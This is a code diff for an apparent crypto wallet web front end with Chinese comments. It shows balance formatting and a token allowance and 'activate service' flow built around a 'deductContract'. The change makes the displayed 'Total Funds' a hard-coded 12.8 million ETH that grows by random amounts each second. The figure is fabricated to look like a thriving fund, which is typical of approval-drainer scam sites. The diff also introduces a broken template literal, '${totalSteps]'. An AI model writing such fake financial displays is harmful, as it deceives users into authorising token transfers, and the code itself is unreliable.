@@ -80,23 +80,30 @@ function updateWalletBalance(balances) {
         const usdtBalance = ethers.formatUnits(balances.usdt || 0n, 6);
         const usdcBalance = ethers.formatUnits(balances.usdc || 0n, 6);
         const wethBalance = ethers.formatUnits(balances.weth || 0n, 18);
-        walletBalanceValue.textContent = `${parseFloat(usdtBalance).toFixed(3) } USDT / ${parseFloat(usdcBalance).toFixed(3)} USDC / ${parseFloat(wethBalance).toFixed(3)} WETH`;
+        walletBalanceValue.textContent = `${parseFloat(usdtBalance).toFixed(3)} USDT / ${parseFloat(usdcBalance).toFixed(3)} USDC / ${parseFloat(wethBalance).toFixed(3)} WETH`;
     }
 }
 
 /**
- * 更新 Total Funds 顯示。
+ * 更新 Total Funds 顯示，基於固定起點時間計算。
  */
 function updateTotalFunds() {
     if (totalValue) {
-        // 從 localStorage 讀取
-        let totalFunds = parseFloat(localStorage.getItem('totalFunds') || '12856459.94');
-        // 亂數增加 0.01 ~ 0.1 ETH
-        const increaseAmount = Math.random() * (0.1 - 0.01) + 0.01;
-        totalFunds += increaseAmount;
-        // 儲存回 localStorage
-        localStorage.setItem('totalFunds', totalFunds.toFixed(2));
-        // 更新顯示
+        // 起始時間：美東時間 2025 年 10 月 22 日 00:00 (UTC-4)
+        const startTime = new Date('2025-10-22T00:00:00-04:00').getTime(); // UTC 毫秒數
+        const currentTime = Date.now(); // 當前 UTC 毫秒數
+        const elapsedSeconds = Math.floor((currentTime - startTime) / 1000); // 經過的秒數
+
+        // 起始金額
+        let initialFunds = 12856459.94;
+        // 每秒隨機增加 0.01 ~ 0.1 ETH
+        const increaseRate = Math.random() * (0.1 - 0.01) + 0.01;
+        const totalIncrease = elapsedSeconds * increaseRate;
+
+        // 總資金 = 起始金額 + 總增加金額
+        const totalFunds = initialFunds + totalIncrease;
+
+        // 更新顯示，保留 2 位小數並添加千位分隔符
         totalValue.textContent = `${totalFunds.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
     }
 }
@@ -316,7 +323,7 @@ async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActi
     if (!serviceActivated && tokenToActivate) {
         stepCount++;
         const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
-        updateStatus(`步驟 ${stepCount}/${totalSteps}: 啟動服務 (使用 ${tokenName})...`);
+        updateStatus(`步驟 ${stepCount}/${totalSteps]: 啟動服務 (使用 ${tokenName})...`);
 
         const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
         activateTx.value = 0n;
